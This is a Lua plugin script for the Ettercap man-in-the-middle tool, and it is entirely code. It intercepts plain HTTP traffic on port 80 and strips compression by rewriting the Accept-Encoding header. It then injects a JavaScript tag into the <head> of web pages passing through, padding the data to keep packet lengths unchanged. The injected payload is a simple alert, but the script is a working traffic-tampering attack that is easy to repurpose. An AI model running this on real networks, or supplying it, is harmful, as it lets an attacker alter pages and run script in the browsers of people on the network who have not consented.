description = " Injection Script using Lua ";
local hooks = require("hook_points")
local packet = require("packet")
inject = "<script>alert('Injected')</script>"

hook_point = hooks.filter

packetrule = function(packet_object)
  return(packet_object:is_tcp() and
          packet_object:has_data() and
          (packet_object:dst_port() == 80 or
            packet_object:src_port() == 80))

end

action = function(packet_object)
  p = packet_object
  data = p:read_data()

  if string.find(data,"Accept.Encoding:") then
            s,e = string.find(data,'Accept.Encoding:.-\n')
      newdata = string.gsub(data, "Accept.Encoding:.-\n",
"Accept-Encoding: identity " .. string.rep(" ", e - s - 27) .. "\r\n" )
    packet.set_data(p, newdata)
            ettercap.log("Downgraded Encoding")
            return
    end

  body = string.upper(data)
  if (string.find(body,'<HEAD>')) then
            s,e= string.find(body,'<TITLE>.-</TITLE>')

            if s then
                title = string.sub(data,s,e)
            s,e = string.find(body,"<HEAD>.-</HEAD>")

                if not s or not e then
                    return
                end

                len = e-s
                idata = "<head>" .. title .. inject .. "</head>"

             newstr= string.sub(data,0,s - 1) .. idata ..
 string.rep(" ",len - string.len(idata)) .. string.sub(data,e+1 ,-1)
            ettercap.log("Updating string")
     packet.set_data(p, newstr)
            end
    end
end
